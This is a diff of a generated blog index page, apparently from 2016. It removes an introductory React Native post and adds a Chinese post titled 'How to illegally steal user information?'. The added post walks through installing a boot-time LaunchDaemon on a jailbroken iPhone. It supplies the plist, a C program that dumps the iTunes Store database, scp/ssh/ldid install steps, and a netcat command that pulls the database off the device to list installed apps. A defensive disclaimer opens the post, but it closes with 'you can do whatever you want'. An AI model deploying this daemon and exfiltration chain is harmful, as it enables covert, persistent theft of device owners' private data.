@@ -7,12 +7,7 @@
 	<meta name="author" content="Rick">
 
 	
-	<meta name="description" content="1 Hack 必备的命令与工具 常用的命令和工具 ps ——显示进程状态，CPU 使用率，内存使用情况等
-sysctl ——检查设定 Kernel 配置
-netstat ——显示网络连接，路由表，接口状态等
-route ——路由修改
-renice ——调整程序运行的优先级
-ifconfig —— &hellip;">
+	<meta name="description" content="2 后台 daemon 非法窃取用户 iTunesstore 信息 本人郑重声明：并不鼓励窃取用户隐私等行为，一切 hack 学习都只是为了研究如何防御。OK，进入正题。 开机自启动 在 iOS 黑客工具中，介绍了如何编译自己的 C 程序并手动启动。今天介绍如何使程序变为开机自启动。 首先打开 &hellip;">
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -80,6 +75,210 @@ ifconfig —— &hellip;">
 		
 	
 	<div id="content" class="inner">
+
+
+    <article class="post">
+	<h2 class="title">
+		
+		<a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/">
+		
+			如何非法窃取用户信息？</a>
+	</h2>
+	<div class="entry-content">
+		<div class="container">
+<div class="item chapter">
+    <h1 class="title"><span class="label">2</span> <span class="title">后台 daemon 非法窃取用户 iTunesstore 信息</span></h1>
+    <p>本人郑重声明：并不鼓励窃取用户隐私等行为，一切 hack 学习都只是为了研究如何防御。OK，进入正题。</p>
+
+<h3>开机自启动</h3>
+
+<p>在 <a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/">iOS 黑客工具</a>中，介绍了如何编译自己的 C 程序并手动启动。今天介绍如何使程序变为开机自启动。</p>
+
+<h4>首先打开 Xcode 创建一个 plist 属性文件，如下图所示：</h4>
+
+<div class="figure" id="figure-2-1">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f74ojhy4upj20gg06cq46.jpg" />
+
+    <p class="caption"><strong>图片 2.1</strong> daemon1</p>
+</div>
+
+
+<p>其中要注意一下通信服务名，我定为 55 。用编辑器打开，即为：</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span class="line"><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
+</span><span class="line"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
+</span><span class="line"><span class="nt">&lt;dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>Program<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>StandardErrorPath<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;string&gt;</span>/dev/null<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>SessionCreate<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;true/&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>ProgramArguments<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;array&gt;</span>
+</span><span class="line">        <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/array&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>inetdCompatibility<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">        <span class="nt">&lt;key&gt;</span>Wait<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">        <span class="nt">&lt;false/&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;key&gt;</span>Sockets<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">        <span class="nt">&lt;key&gt;</span>Listeners<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">        <span class="nt">&lt;dict&gt;</span>
+</span><span class="line">            <span class="nt">&lt;key&gt;</span>SockServiceName<span class="nt">&lt;/key&gt;</span>
+</span><span class="line">            <span class="nt">&lt;string&gt;</span>55<span class="nt">&lt;/string&gt;</span>
+</span><span class="line">        <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
+</span><span class="line"><span class="nt">&lt;/dict&gt;</span>
+</span><span class="line"><span class="nt">&lt;/plist&gt;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>最后，将 plist 文件 scp 至 <code>root@192.168.1.114:/System/Library/LaunchDaemons/</code>下 。</p>
+
+<h3>编写读取 iTunesstore 数据库程序</h3>
+
+<p>读取 itunesstored2.sqlitedb 信息，并输出到 stdout 中，便于我们读取。</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#include &lt;stdio.h&gt;  </span>
+</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
+</span><span class="line">
+</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">FILE</span> <span class="s">&quot;/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb&quot;</span>
+</span><span class="line">
+</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
+</span><span class="line">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span><span class="line">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+</span><span class="line">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class="line">
+</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span><span class="line">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+</span><span class="line">    <span class="k">while</span> <span class="p">((</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
+</span><span class="line">        <span class="n">write</span><span class="p">(</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdout</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+</span><span class="line">    <span class="p">}</span>
+</span><span class="line">    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class="line">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class="line"><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h3>编译、拷贝、签名</h3>
+
+<h4>编译方法上篇文章已经介绍清楚，这里不再重复，直接 ￥%￥＃%￥……%＃ 生成运行在 ARM 的 ncdemo</h4>
+
+<h4>将 ncdemo scp 到设备中，并登录</h4>
+
+<div class="code code">
+<pre class="code">$ scp ncdemo root@192.168.1.114:ncdemo
+$ ssh root@192.168.1.114</pre>
+</div>
+
+<h4>签名</h4>
+
+<div class="code code">
+<pre class="code"> #ldid -S ncdemo
+ #mv ncdemo /usr/bin</pre>
+</div>
+
+<h3>抓取 iTunesstore 数据信息</h3>
+
+<p>这时，我们只需要利用 netcat，指定之前定义的服务名称，轻松在本地抓取设备 iTunesstore 信息.
+<code>$ nc 192.168.1.114 55 &gt; itunesstored2.sqlitedb</code></p>
+
+<h3>分析 iTunesstore 数据信息</h3>
+
+<p>好吧，这里就介绍个最简单的应用，利用string命令查看：
+<code>$ strings itunesstored2.sqlitedb</code></p>
+
+<p>于是乎，我们就清晰的得到了 iPhone/iPad 设备上都安装了哪些 app ：</p>
+
+<div class="figure" id="figure-2-2">
+    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f74ol56kfgj20df0gfgpo.jpg" />
+
+    <p class="caption"><strong>图片 2.2</strong> daemon2</p>
+</div>
+
+
+<p>当然，除了这些，你想干什么都可以……夜深了，先写到这里吧……</p>
+
+</div>
+</div>
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
 
 
     <article class="post">
@@ -1000,119 +1199,6 @@ case&#8217;s data type, or is empty if the case has no data type.</p>
 </div>
 	
 	<div class="comments"><a href="/Blog/blog/2016/03/23/javascriptxue-xi-zhi-ji-ben-gai-nian/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/03/23/react-native/">
-		
-			React Native</a>
-	</h2>
-	<div class="entry-content">
-		<p>
-React-Native 帮助在原生平台打造世界一流的应用体验，使用基于<code>JavaSript</code>和React的结合的开发经验。React-Native的宗旨是更有效的开发全平台的应用。
-</p>
-
-<h2>Native Components</h2>
-<p>
-在React-Native你能使用标准平台组件如：iOS的<code>UITabBar</code>以及<code>Android</code>的<code>Drawer</code>。这个给了你APP标准统一的外观，使用这个平台的生态系统，去保持高质量。这些组件能轻易的嵌入到你的APP中使用，和React组件是差不多的，例如:<code>TabBariOS</code>和<code>DrawerLayoutAndroid</code>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="c1">// iOS</span>
-</span><span class="line">
-</span><span class="line"><span class="kd">var</span> <span class="nx">React</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;react-native&#39;</span><span class="p">);</span>
-</span><span class="line"><span class="kd">var</span> <span class="p">{</span> <span class="nx">TabBarIOS</span><span class="p">,</span> <span class="nx">NavigatorIOS</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">React</span><span class="p">;</span>
-</span><span class="line">
-</span><span class="line"><span class="kd">var</span> <span class="nx">App</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nx">createClass</span><span class="p">({</span>
-</span><span class="line">  <span class="nx">render</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span><span class="line">    <span class="k">return</span> <span class="p">(</span>
-</span><span class="line">      <span class="o">&lt;</span><span class="nx">TabBarIOS</span><span class="o">&gt;</span>
-</span><span class="line">        <span class="o">&lt;</span><span class="nx">TabBarIOS</span><span class="p">.</span><span class="nx">Item</span> <span class="nx">title</span><span class="o">=</span><span class="s2">&quot;React Native&quot;</span> <span class="nx">selected</span><span class="o">=</span><span class="p">{</span><span class="kc">true</span><span class="p">}</span><span class="o">&gt;</span>
-</span><span class="line">          <span class="o">&lt;</span><span class="nx">NavigatorIOS</span> <span class="nx">initialRoute</span><span class="o">=</span><span class="p"></span> <span class="o">/&gt;</span>
-</span><span class="line">        <span class="o">&lt;</span><span class="err">/TabBarIOS.Item&gt;</span>
-</span><span class="line">      <span class="o">&lt;</span><span class="err">/TabBarIOS&gt;</span>
-</span><span class="line">    <span class="p">);</span>
-</span><span class="line">  <span class="p">},</span>
-</span><span class="line"><span class="p">});</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="c1">// Android</span>
-</span><span class="line">
-</span><span class="line"><span class="kd">var</span> <span class="nx">React</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;react-native&#39;</span><span class="p">);</span>
-</span><span class="line"><span class="kd">var</span> <span class="p">{</span> <span class="nx">DrawerLayoutAndroid</span><span class="p">,</span> <span class="nx">ProgressBarAndroid</span><span class="p">,</span> <span class="nx">Text</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">React</span><span class="p">;</span>
-</span><span class="line">
-</span><span class="line"><span class="kd">var</span> <span class="nx">App</span> <span class="o">=</span> <span class="nx">React</span><span class="p">.</span><span class="nx">createClass</span><span class="p">({</span>
-</span><span class="line">  <span class="nx">render</span><span class="o">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
-</span><span class="line">    <span class="k">return</span> <span class="p">(</span>
-</span><span class="line">      <span class="o">&lt;</span><span class="nx">DrawerLayoutAndroid</span>
-</span><span class="line">        <span class="nx">renderNavigationView</span><span class="o">=</span><span class="p">{()</span> <span class="o">=&gt;</span> <span class="o">&lt;</span><span class="nx">Text</span><span class="o">&gt;</span><span class="nx">React</span> <span class="nx">Native</span><span class="o">&lt;</span><span class="err">/Text&gt;}&gt;</span>
-</span><span class="line">        <span class="o">&lt;</span><span class="nx">ProgressBarAndroid</span> <span class="o">/&gt;</span>
-</span><span class="line">      <span class="o">&lt;</span><span class="err">/DrawerLayoutAndroid&gt;</span>
-</span><span class="line">    <span class="p">);</span>
-</span><span class="line">  <span class="p">},</span>
-</span><span class="line"><span class="p">});</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-</p>
-
-<h2>异步执行</h2>
-<p>
-所有的<code>Javascript</code>应用程序代码以及原生平台的操作都是异步的，并且原生模块也能够使用额外的线程。这意味着我们能关闭主线程的图像解码，后台把图片保存到磁盘，渲染文字和计算布局而不会阻塞UI。这样一来，React-Native应用自然流畅性和响应。通信也完全序列化，这使我们能够充分利用<code>Chrome</code>开发者工具来调试<code>Javascript</code>的运行时完整的应用程序，无论是模拟器还是真实设备。
-</p>
-
-		
-		<a href="/Blog/blog/2016/03/23/react-native/" class="more-link">Read on &rarr;</a>
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/react-native/'>React-Native</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/03/23/react-native/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
